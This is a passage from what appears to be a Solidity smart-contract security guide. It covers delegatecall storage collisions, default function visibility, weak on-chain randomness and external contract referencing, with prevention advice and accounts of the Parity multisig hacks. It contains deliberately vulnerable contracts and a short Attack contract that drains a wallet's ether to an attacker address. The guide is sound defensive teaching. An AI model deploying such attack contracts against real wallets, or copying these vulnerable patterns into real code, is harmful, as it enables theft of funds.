    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setStart</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span> _start</span>) <span class="hljs-title">public</span> </span>{
        start = _start;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setFibonacci</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span> n</span>) <span class="hljs-title">public</span> </span>{
        calculatedFibNumber = fibonacci(n);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fibonacci</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span> n</span>) <span class="hljs-title">internal</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint</span></span>) </span>{
        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> start;
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> start + <span class="hljs-number">1</span>;
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> fibonacci(n - <span class="hljs-number">1</span>) + fibonacci(n - <span class="hljs-number">2</span>);
    }
}
</pre></div>

<p>This library provides a function which can generate the <em>n</em>-th Fibonacci number in the sequence. It allows users to change the starting number of the sequence (<code>start</code>) and calculate the <em>n</em>-th Fibonacci-like numbers in this new sequence.</p>
<p>Let's now consider a contract that utilises this library.</p>
<p><code>FibonacciBalance.sol</code>:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">FibonacciBalance</span> </span>{

    <span class="hljs-built_in">address</span> <span class="hljs-keyword">public</span> fibonacciLibrary;
    <span class="hljs-comment">// the current fibonacci number to withdraw</span>
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> calculatedFibNumber;
    <span class="hljs-comment">// the starting fibonacci sequence number</span>
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> start = <span class="hljs-number">3</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> withdrawalCounter;
    <span class="hljs-comment">// the fibonancci function selector</span>
    <span class="hljs-built_in">bytes4</span> <span class="hljs-keyword">constant</span> fibSig = <span class="hljs-built_in">bytes4</span>(<span class="hljs-built_in">sha3</span>(<span class="hljs-string">"setFibonacci(uint256)"</span>));

    <span class="hljs-comment">// constructor - loads the contract with ether</span>
    <span class="hljs-function"><span class="hljs-literal">constructor</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _fibonacciLibrary</span>) <span class="hljs-keyword">public</span> <span class="hljs-keyword">payable</span> </span>{
        fibonacciLibrary = _fibonacciLibrary;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) </span>{
        withdrawalCounter += <span class="hljs-number">1</span>;
        <span class="hljs-comment">// calculate the fibonacci number for the current withdrawal user</span>
        <span class="hljs-comment">// this sets calculatedFibNumber</span>
        <span class="hljs-built_in">require</span>(fibonacciLibrary.<span class="hljs-built_in">delegatecall</span>(fibSig, withdrawalCounter));
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(calculatedFibNumber * <span class="hljs-number">1</span> <span class="hljs-built_in">ether</span>);
    }

    <span class="hljs-comment">// allow users to call fibonacci library functions</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(fibonacciLibrary.<span class="hljs-built_in">delegatecall</span>(<span class="hljs-built_in">msg</span>.data));
    }
}
</pre></div>

<p>This contract allows a participant to withdraw ether from the contract, with the amount of ether being equal to the Fibonacci number corresponding to the participants withdrawal order; i.e., the first participant gets 1 ether, the second also gets 1, the third gets 2, the forth gets 3, the fifth 5 and so on (until the balance of the contract is less than the Fibonacci number being withdrawn).</p>
<p>There are a number of elements in this contract that may require some explanation. Firstly, there is an interesting-looking variable, <code>fibSig</code>. This holds the first 4 bytes of the Keccak (SHA-3) hash of the string "setFibonacci(uint256)". This is known as the <a href="https://solidity.readthedocs.io/en/latest/abi-spec.html#function-selector">function selector</a> and is put into <code>calldata</code> to specify which function of a smart contract will be called. It is used in the <code>delegatecall</code> function on line [21] to specify that we wish to run the <code>setFibonacci(uint256)</code> function. The second argument in <code>delegatecall</code> is the parameter we are passing to the function. Secondly, we assume that the address for the <code>FibonacciLib</code> library is correctly referenced in the constructor (section <a href="https://blog.sigmaprime.io/solidity-security.html#contract-reference">External Contract Referencing</a> discuss some potential vulnerabilities relating to this kind if contract reference initialisation).</p>
<p>Can you spot any error(s) in this contract? If you put this into remix, fill it with ether and call <code>withdraw()</code>, it will likely revert.</p>
<p>You may have noticed that the state variable <code>start</code> is used in both the library and the main calling contract. In the library contract, <code>start</code> is used to  specify the beginning of the Fibonacci sequence and is set to <code>0</code>, whereas it is set to <code>3</code> in the <code>FibonacciBalance</code> contract. You may also have noticed that the fallback function in the <code>FibonacciBalance</code> contract allows all calls to be passed to the library contract, which allows for the <code>setStart()</code> function of the library contract to be called also. Recalling that we preserve the state of the contract, it may seem that this function would allow you to change the state of the <code>start</code> variable in the local <code>FibonnacciBalance</code> contract. If so, this would allow one to withdraw more ether, as the resulting <code>calculatedFibNumber</code> is dependent on the <code>start</code> variable (as seen in the library contract). In actual fact, the <code>setStart()</code> function does not (and cannot) modify the <code>start</code> variable in the <code>FibonacciBalance</code> contract. The underlying vulnerability in this contract is significantly worse than just modifying the <code>start</code> variable.</p>
<p>Before discussing the actual issue, we take a quick detour to understanding how state variables (<code>storage</code> variables) actually get stored in contracts. State or <code>storage</code> variables (variables that persist over individual transactions) are placed into <code>slots</code> sequentially as they are introduced in the contract. (There are some complexities here, and I encourage the reader to read <a href="http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage">Layout of State Variables in Storage</a> for a more thorough understanding).</p>
<p>As an example, let's look at the library contract. It has two state variables, <code>start</code> and <code>calculatedFibNumber</code>. The first variable is <code>start</code>, as such it gets stored into the contract's storage at <code>slot[0]</code> (i.e. the first slot). The second variable, <code>calculatedFibNumber</code>, gets placed in the next available storage slot, <code>slot[1]</code>. If we look at the function <code>setStart()</code>, it takes an input and sets <code>start</code> to whatever the input was. This function is therefore setting <code>slot[0]</code> to whatever input we provide in the <code>setStart()</code> function. Similarly, the <code>setFibonacci()</code> function sets <code>calculatedFibNumber</code> to the result of <code>fibonacci(n)</code>. Again, this is simply setting storage <code>slot[1]</code> to the value of <code>fibonacci(n)</code>.</p>
<p>Now let's look at the <code>FibonacciBalance</code> contract. Storage <code>slot[0]</code> now corresponds to <code>fibonacciLibrary</code> address and <code>slot[1]</code> corresponds to <code>calculatedFibNumber</code>. It is in this incorrect mapping that the vulnerability occurs. <code>delegatecall</code> <strong>preserves contract context</strong>. This means that code that is executed via <code>delegatecall</code> will act on the state (i.e. storage) of the calling contract.</p>
<p>Now notice that in <code>withdraw()</code> on line [21] we execute, <code>fibonacciLibrary.delegatecall(fibSig,withdrawalCounter)</code>. This calls the <code>setFibonacci()</code> function, which as we discussed, modifies storage  <code>slot[1]</code>, which in our current context is <code>calculatedFibNumber</code>. This is as expected (i.e. after execution, <code>calculatedFibNumber</code> gets adjusted). However, recall that the <code>start</code> variable in the <code>FibonacciLib</code> contract is located in storage <code>slot[0]</code>, which is the <code>fibonacciLibrary</code> address in the current contract. This means that the function <code>fibonacci()</code> will give an unexpected result. This is because it references <code>start</code> (<code>slot[0]</code>) which in the current calling context is the <code>fibonacciLibrary</code> address (which will often be quite large, when interpreted as a <code>uint</code>). Thus it is likely that the <code>withdraw()</code> function will revert as it will not contain <code>uint(fibonacciLibrary)</code> amount of ether, which is what <code>calculatedFibNumber</code> will return.</p>
<p>Even worse, the <code>FibonacciBalance</code> contract allows users to call all of the <code>fibonacciLibrary</code> functions via the fallback function on line [26]. As we discussed earlier, this includes the <code>setStart()</code> function. We discussed that this function allows anyone to modify or set storage <code>slot[0]</code>. In this case, storage <code>slot[0]</code> is the <code>fibonacciLibrary</code> address. Therefore, an attacker could create a malicious contract (an example of one is given below), convert the address to a <code>uint</code> (this can be done in python easily using <code>int('&lt;address&gt;',16)</code>) and then call <code>setStart(&lt;attack_contract_address_as_uint&gt;)</code>. This will change <code>fibonacciLibrary</code> to the address of the attack contract. Then, whenever a user calls <code>withdraw()</code> or the fallback function, the malicious contract will run (which can steal the entire balance of the contract) because we've modified the actual address for <code>fibonacciLibrary</code>. An example of such an attack contract would be,</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    <span class="hljs-built_in">uint</span> storageSlot0; <span class="hljs-comment">// corresponds to fibonacciLibrary</span>
    <span class="hljs-built_in">uint</span> storageSlot1; <span class="hljs-comment">// corresponds to calculatedFibNumber</span>

    <span class="hljs-comment">// fallback - this will run if a specified function is not found</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        storageSlot1 = <span class="hljs-number">0</span>; <span class="hljs-comment">// we set calculatedFibNumber to 0, so that if withdraw</span>
        <span class="hljs-comment">// is called we don't send out any ether.</span>
        &lt;attacker_address&gt;.<span class="hljs-built_in">transfer</span>(<span class="hljs-keyword">this</span>.balance); <span class="hljs-comment">// we take all the ether</span>
    }
 }
</pre></div>

<p>Notice that this attack contract modifies the <code>calculatedFibNumber</code> by changing storage <code>slot[1]</code>. In principle, an attacker could modify any other storage slots they choose to perform all kinds of attacks on this contract. I encourage all readers to put these contracts into <a href="https://remix.ethereum.org/">Remix</a> and experiment with different attack contracts and state changes through these <code>delegatecall</code> functions.</p>
<p>It is also important to notice that when we say that <code>delegatecall</code> is state-preserving, we are not talking about the variable names of the contract, rather the actual storage slots to which those names point. As you can see from this example, a simple mistake, can lead to an attacker hijacking the entire contract and its ether.</p>
<h3 id="dc-prevention">Preventative Techniques</h3>

<p>Solidity provides the <code>library</code> keyword for implementing library contracts (see the <a href="http://solidity.readthedocs.io/en/latest/contracts.html?highlight=library#libraries">Solidity Docs</a> for further details). This ensures the library contract is stateless and non-self-destructable. Forcing libraries to be stateless mitigates the complexities of storage context demonstrated in this section. Stateless libraries also prevent attacks whereby attackers modify the state of the library directly in order to affect the contracts that depend on the library's code.
As a general rule of thumb, when using <code>DELEGATECALL</code> pay careful attention to the possible calling context of both the library contract and the calling contract, and whenever possible, build state-less libraries.</p>
<h3 id="dc-example">Real-World Example: Parity Multisig Wallet (Second Hack)</h3>

<p>The Second Parity Multisig Wallet hack is an example of how the context of well-written library code can be exploited if run in its non-intended context. There are a number of good explanations of this hack, such as this overview: <a href="https://medium.com/chain-cloud-company-blog/parity-multisig-hack-again-b46771eaa838">Parity MultiSig Hacked. Again</a> by Anthony Akentiev, this <a href="https://ethereum.stackexchange.com/questions/30128/explanation-of-parity-library-suicide/30130">stack exchange question</a> and <a href="http://hackingdistributed.com/2017/07/22/deep-dive-parity-bug/">An In-Depth Look at the Parity Multisig Bug</a>.</p>
<p>To add to these references, let's explore the contracts that were exploited. The library and wallet contract can be found on the parity github <a href="https://github.com/paritytech/parity/blob/b640df8fbb964da7538eef268dffc125b081a82f/js/src/contracts/snippets/enhanced-wallet.sol">here</a>.</p>
<p>Let's look at the relevant aspects of this contract. There are two contracts of interest contained here, the library contract and the wallet contract.</p>
<p>The library contract,</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">WalletLibrary</span> <span class="hljs-keyword">is</span> <span class="hljs-title">WalletEvents</span> </span>{

  ...

  <span class="hljs-comment">// throw unless the contract is not yet initialized.</span>
  <span class="hljs-keyword">modifier</span> only_uninitialized { <span class="hljs-keyword">if</span> (m_numOwners &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span>; _; }

  <span class="hljs-comment">// constructor - just pass on the owner array to the multiowned and</span>
  <span class="hljs-comment">// the limit to daylimit</span>
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initWallet</span>(<span class="hljs-params"><span class="hljs-built_in">address</span>[] _owners, <span class="hljs-built_in">uint</span> _required, <span class="hljs-built_in">uint</span> _daylimit</span>) <span class="hljs-title">only_uninitialized</span> </span>{
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }

  <span class="hljs-comment">// kills the contract sending everything to `_to`.</span>
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">kill</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _to</span>) <span class="hljs-title">onlymanyowners</span>(<span class="hljs-params"><span class="hljs-built_in">sha3</span>(<span class="hljs-built_in">msg</span>.data</span>)) <span class="hljs-title">external</span> </span>{
    <span class="hljs-built_in">suicide</span>(_to);
  }

  ...

}
</pre></div>

<p>and the wallet contract,</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Wallet</span> <span class="hljs-keyword">is</span> <span class="hljs-title">WalletEvents</span> </span>{

  ...

  <span class="hljs-comment">// METHODS</span>

  <span class="hljs-comment">// gets called when no other function matches</span>
  <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) <span class="hljs-title">payable</span> </span>{
    <span class="hljs-comment">// just being sent some cash?</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> &gt; <span class="hljs-number">0</span>)
      Deposit(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>);
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">msg</span>.data.length &gt; <span class="hljs-number">0</span>)
      _walletLibrary.<span class="hljs-built_in">delegatecall</span>(<span class="hljs-built_in">msg</span>.data);
  }

  ...

  <span class="hljs-comment">// FIELDS</span>
  <span class="hljs-built_in">address</span> <span class="hljs-keyword">constant</span> _walletLibrary = <span class="hljs-number">0xcafecafecafecafecafecafecafecafecafecafe</span>;
}
</pre></div>

<p>Notice that the <code>Wallet</code> contract essentially passes all calls to the <code>WalletLibrary</code> contract via a delegate call. The constant <code>_walletLibrary</code> address in this code snippet acts as a placeholder for the actually deployed <code>WalletLibrary</code> contract (which was at <code>0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4</code>).</p>
<p>The intended operation of these contracts was to have a simple low-cost deployable <code>Wallet</code> contract whose code base and main functionality was in the <code>WalletLibrary</code> contract. Unfortunately, the <code>WalletLibrary</code> contract is itself a contract and maintains it's own state. Can you see why this might be an issue?</p>
<p>It is possible to send calls to the <code>WalletLibrary</code> contract itself. Specifically, the <code>WalletLibrary</code> contract could be initialised, and become owned. A user did this, by calling <code>initWallet()</code> function on the <code>WalletLibrary</code> contract, becoming an owner of the library contract. The same user, subsequently called the <code>kill()</code> function. Because the user was an owner of the Library contract, the modifier passed and the library contract suicided. As all <code>Wallet</code> contracts in existence refer to this library contract and contain no method to change this reference, all of their functionality, including the ability to withdraw ether is lost along with the <code>WalletLibrary</code> contract. More directly, all ether in all parity multi-sig wallets of this type instantly become lost or permanently unrecoverable.</p>
<h2 id="visibility"><span id="SP-5">5. Default Visibilities</span></h2>

<p>Functions in Solidity have visibility specifiers which dictate how functions are allowed to be called. The visibility determines whether a function can be called externally by users, by other derived contracts, only internally or only externally. There are four visibility specifiers, which are described in detail in the <a href="http://solidity.readthedocs.io/en/latest/contracts.html?highlight=library#visibility-and-getters">Solidity Docs</a>. Functions default to <code>public</code> allowing users to call them externally. Incorrect use of visibility specifiers can lead to some devestating vulernabilities in smart contracts as will be discussed in this section.</p>
<h3 id="visibility-vuln">The Vulnerability</h3>

<p>The default visibility for functions is <code>public</code>. Therefore functions that do not specify any visibility will be callable by external users.  The issue comes when developers mistakenly ignore visibility specifiers on functions which should be private (or only callable within the contract itself).</p>
<p>Let's quickly explore a trivial example.</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">HashForEther</span> </span>{

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawWinnings</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-comment">// Winner if the last 8 hex characters of the address are 0.</span>
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">uint32</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>) == <span class="hljs-number">0</span>);
        _sendWinnings();
     }

     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_sendWinnings</span>(<span class="hljs-params"></span>) </span>{
         <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(<span class="hljs-keyword">this</span>.balance);
     }
}
</pre></div>

<p>This simple contract is designed to act as an address guessing bounty game. To win the balance of the contract, a user must generate an Ethereum address whose last 8 hex characters are 0. Once obtained, they can call the <code>WithdrawWinnings()</code> function to obtain their bounty.</p>
<p>Unfortunately, the visibility of the functions have not been specified. In particular, the <code>_sendWinnings()</code> function is <code>public</code> and thus any address can call this function to steal the bounty.</p>
<h3 id="visibility-prevention">Preventative Techniques</h3>

<p>It is good practice to always specify the visibility of all functions in a contract, even if they are intentionally <code>public</code>. Recent versions of Solidity will now show warnings during compilation for functions that have no explicit visibility set, to help encourage this practice.</p>
<h3 id="visibility-example">Real-World Example: Parity MultiSig Wallet (First Hack)</h3>

<p>In the first Parity multi-sig hack, about \$31M worth of Ether was stolen from primarily three wallets. A good recap of exactly how this was done is given by Haseeb Qureshi in <a href="https://medium.freecodecamp.org/a-hacker-stole-31m-of-ether-how-it-happened-and-what-it-means-for-ethereum-9e5dc29e33ce">this post</a>.</p>
<p>Essentially, the multi-sig wallet (which can be found <a href="https://github.com/paritytech/parity/blob/4d08e7b0aec46443bf26547b17d10cb302672835/js/src/contracts/snippets/enhanced-wallet.sol">here</a>) is constructed from a base <code>Wallet</code> contract which calls a library contract containing the core functionality (as was described in <a href="https://blog.sigmaprime.io/solidity-security.html#dc-example">Real-World Example: Parity Multisig (Second Hack)</a>). The library contract contains the code to initialise the wallet as can be seen from the following snippet</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">WalletLibrary</span> <span class="hljs-keyword">is</span> <span class="hljs-title">WalletEvents</span> </span>{

  ...

  <span class="hljs-comment">// METHODS</span>

  ...

  <span class="hljs-comment">// constructor is given number of sigs required to do protected "onlymanyowners" transactions</span>
  <span class="hljs-comment">// as well as the selection of addresses capable of confirming them.</span>
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initMultiowned</span>(<span class="hljs-params"><span class="hljs-built_in">address</span>[] _owners, <span class="hljs-built_in">uint</span> _required</span>) </span>{
    m_numOwners = _owners.length + <span class="hljs-number">1</span>;
    m_owners[<span class="hljs-number">1</span>] = <span class="hljs-built_in">uint</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>);
    m_ownerIndex[<span class="hljs-built_in">uint</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>)] = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">uint</span> i = <span class="hljs-number">0</span>; i &lt; _owners.length; ++i)
    {
      m_owners[<span class="hljs-number">2</span> + i] = <span class="hljs-built_in">uint</span>(_owners[i]);
      m_ownerIndex[<span class="hljs-built_in">uint</span>(_owners[i])] = <span class="hljs-number">2</span> + i;
    }
    m_required = _required;
  }

  ...

  <span class="hljs-comment">// constructor - just pass on the owner array to the multiowned and</span>
  <span class="hljs-comment">// the limit to daylimit</span>
  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initWallet</span>(<span class="hljs-params"><span class="hljs-built_in">address</span>[] _owners, <span class="hljs-built_in">uint</span> _required, <span class="hljs-built_in">uint</span> _daylimit</span>) </span>{
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }
}
</pre></div>

<p>Notice that neither of the functions have explicitly specified a visibility. Both functions default to <code>public</code>. The <code>initWallet()</code> function is called in the wallets constructor and sets the owners for the multi-sig wallet as can be seen in the <code>initMultiowned()</code> function. Because these functions were accidentally left <code>public</code>, an attacker was able to call these functions on deployed contracts, resetting the ownership to the attackers address. Being the owner, the attacker then drained the wallets of all their ether, to the tune of \$31M.</p>
<h2 id="entropy"><span id="SP-6">6. Entropy Illusion</span></h2>

<p>All transactions on the Ethereum blockchain are deterministic state transition operations. Meaning that every transaction modifies the global state of the Ethereum ecosystem and it does so in a calculable way with no uncertainty. This ultimately means that inside the blockchain ecosystem there is no source of entropy or randomness. There is no <code>rand()</code> function in Solidity. Achieving decentralised entropy (randomness) is a well established problem and many ideas have been proposed to address this (see for example, <a href="https://github.com/randao/randao">RandDAO</a> or using a chain of Hashes as described by Vitalik in this <a href="https://vitalik.ca/files/randomness.html">post</a>).</p>
<h3 id="entropy-vuln">The Vulnerability</h3>

<p>Some of the first contracts built on the Ethereum platform were based around gambling. Fundamentally, gambling requires uncertainty (something to bet on), which makes building a gambling system on the blockchain (a deterministic system) rather difficult. It is clear that the uncertainty must come from a source external to the blockchain. This is possible for bets amongst peers (see for example the <a href="https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract">commit-reveal technique</a>), however, it is significantly more difficult if you want to implement a contract to act as <em>the house</em> (like in blackjack our roulette). A common pitfall is to use future block variables, such as hashes, timestamps, blocknumber or gas limit. The issue with these are that they are controlled by the miner who mines the block and as such are not truly random. Consider, for example, a roulette smart contract with logic that returns a black number if the next block hash ends in an even number. A miner (or miner pool) could bet \$1M on black. If they solve the next block and find the hash ends in an odd number, they would happily not publish their block and mine another until they find a solution with the block hash being an even number (assuming the block reward and fees are less than $1M). Using past or present variables can be even more devastating as Martin Swende demonstrates in his excellent <a href="http://martin.swende.se/blog/Breaking_the_house.html">blog post</a>. Furthermore, using solely block variables mean that the pseudo-random number will be the same for all transactions in a block, so an attacker can multiply their wins by doing many transactions within a block (should there be a maximum bet).</p>
<h3 id="entropy-prevention">Preventative Techniques</h3>

<p>The source of entropy (randomness) must be external to the blockchain. This can be done amongst peers with systems such as <a href="https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract">commit-reveal</a>, or via changing the trust model to a group of participants (such as in <a href="https://github.com/randao/randao">RandDAO</a>). This can also be done via a centralised entity, which acts as a randomness oracle. Block variables (in general, there are some exceptions) should not be used to source entropy as they can be manipulated by miners.</p>
<h3 id="entropy-example">Real-World Example: PRNG Contracts</h3>

<p>Arseny Reutov wrote a <a href="https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620">blog post</a> after he analysed 3649 live smart contracts which were using some sort of pseudo random number generator (PRNG) and found 43 contracts which could be exploited.</p>
<h2 id="contract-reference"><span id="SP-7">7. External Contract Referencing</span></h2>

<p>One of the benefits of the Ethereum <em>global computer</em> is the ability to re-use code and interact with contracts already deployed on the network. As a result, a large number of contracts reference external contracts and in general operation use external message calls to interact with these contracts. These external message calls can mask malicious actors intentions in some non-obvious ways, which we will discuss.</p>
<h3 id="cr-vuln">The Vulnerability</h3>

<p>In Solidity, any address can be cast as a contract regardless of whether the code at the address represents the contract type being cast. This can be deceiving, especially when the author of the contract is trying to hide malicious code. Let us illustrate this with an example:</p>
<p>Consider a piece of code which rudimentarily implements the <a href="https://blog.sigmaprime.io/www.wikipedia.com/rot13">Rot13</a> cipher.</p>
<p><code>Rot13Encryption.sol</code>:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-comment">//encryption contract</span>
<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Rot13Encryption</span> </span>{

   <span class="hljs-class"><span class="hljs-keyword">event</span> <span class="hljs-literal">Result</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> convertedString</span>)</span>;

    <span class="hljs-comment">//rot13 encrypt a string</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rot13Encrypt</span> (<span class="hljs-params"><span class="hljs-built_in">string</span> text</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">uint256</span> length = <span class="hljs-built_in">bytes</span>(text).length;
        <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">0</span>; i &lt; length; i++) {
            <span class="hljs-built_in">byte</span> char = <span class="hljs-built_in">bytes</span>(text)[i];
            <span class="hljs-comment">//inline assembly to modify the string</span>
            <span class="hljs-keyword">assembly</span> {
                char := <span class="hljs-built_in">byte</span>(<span class="hljs-number">0</span>,char) <span class="hljs-comment">// get the first byte</span>
                <span class="hljs-keyword">if</span> and(gt(char,<span class="hljs-number">0x6D</span>), lt(char,<span class="hljs-number">0x7B</span>)) <span class="hljs-comment">// if the character is in [n,z], i.e. wrapping.</span>
                { char:= sub(<span class="hljs-number">0x60</span>, sub(<span class="hljs-number">0x7A</span>,char)) } <span class="hljs-comment">// subtract from the ascii number a by the difference char is from z.</span>
                <span class="hljs-keyword">if</span> iszero(eq(char, <span class="hljs-number">0x20</span>)) <span class="hljs-comment">// ignore spaces</span>
                {mstore8(add(add(text,<span class="hljs-number">0x20</span>), mul(i,<span class="hljs-number">1</span>)), add(char,<span class="hljs-number">13</span>))} <span class="hljs-comment">// add 13 to char.</span>
            }
        }
        <span class="hljs-function"><span class="hljs-keyword">emit</span> <span class="hljs-literal">Result</span>(<span class="hljs-params">text</span>)</span>;
    }

    <span class="hljs-comment">// rot13 decrypt a string</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rot13Decrypt</span> (<span class="hljs-params"><span class="hljs-built_in">string</span> text</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">uint256</span> length = <span class="hljs-built_in">bytes</span>(text).length;
        <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">0</span>; i &lt; length; i++) {
            <span class="hljs-built_in">byte</span> char = <span class="hljs-built_in">bytes</span>(text)[i];
            <span class="hljs-keyword">assembly</span> {
                char := <span class="hljs-built_in">byte</span>(<span class="hljs-number">0</span>,char)
                <span class="hljs-keyword">if</span> and(gt(char,<span class="hljs-number">0x60</span>), lt(char,<span class="hljs-number">0x6E</span>))
                { char:= add(<span class="hljs-number">0x7B</span>, sub(char,<span class="hljs-number">0x61</span>)) }
                <span class="hljs-keyword">if</span> iszero(eq(char, <span class="hljs-number">0x20</span>))
                {mstore8(add(add(text,<span class="hljs-number">0x20</span>), mul(i,<span class="hljs-number">1</span>)), sub(char,<span class="hljs-number">13</span>))}
            }
        }
        <span class="hljs-function"><span class="hljs-keyword">emit</span> <span class="hljs-literal">Result</span>(<span class="hljs-params">text</span>)</span>;
    }
}
</pre></div>

<p>This code simply takes a string (letters a-z, without validation) and <em>encrypts</em> it by shifting each character 13 places to the right (wrapping around 'z'); i.e. 'a' shifts to 'n' and 'x' shifts to 'k'. The assembly in here is not important, so don't worry if it doesn't make any sense at this stage.</p>
<p>Consider the following contract which uses this code for its encryption,</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-keyword">import</span> <span class="hljs-string">"Rot13Encryption.sol"</span>;

<span class="hljs-comment">// encrypt your top secret info</span>
<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">EncryptionContract</span> </span>{
    <span class="hljs-comment">// library for encryption</span>
    Rot13Encryption encryptionLibrary;

    <span class="hljs-comment">// constructor - initialise the library</span>
    <span class="hljs-function"><span class="hljs-literal">constructor</span>(<span class="hljs-params">Rot13Encryption _encryptionLibrary</span>) </span>{
        encryptionLibrary = _encryptionLibrary;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encryptPrivateData</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> privateInfo</span>) </span>{
        <span class="hljs-comment">// potentially do some operations here</span>
        encryptionLibrary.rot13Encrypt(privateInfo);
     }
 }
</pre></div>

<p>The issue with this contract is that the <code>encryptionLibrary</code> address is not public or constant. Thus the deployer of the contract could have given an address in the constructor which points to this contract:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-comment">//encryption contract</span>
<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Rot26Encryption</span> </span>{

   <span class="hljs-class"><span class="hljs-keyword">event</span> <span class="hljs-literal">Result</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> convertedString</span>)</span>;

    <span class="hljs-comment">//rot13 encrypt a string</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rot13Encrypt</span> (<span class="hljs-params"><span class="hljs-built_in">string</span> text</span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">uint256</span> length = <span class="hljs-built_in">bytes</span>(text).length;
        <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">0</span>; i &lt; length; i++) {
            <span class="hljs-built_in">byte</span> char = <span class="hljs-built_in">bytes</span>(text)[i];
            <span class="hljs-comment">//inline assembly to modify the string</span>
            <span class="hljs-keyword">assembly</span> {
                char := <span class="hljs-built_in">byte</span>(<span class="hljs-number">0</span>,char) <span class="hljs-comment">// get the first byte</span>
                <span class="hljs-keyword">if</span> and(gt(char,<span class="hljs-number">0x6D</span>), lt(char,<span class="hljs-number">0x7B</span>)) <span class="hljs-comment">// if the character is in [n,z], i.e. wrapping.</span>
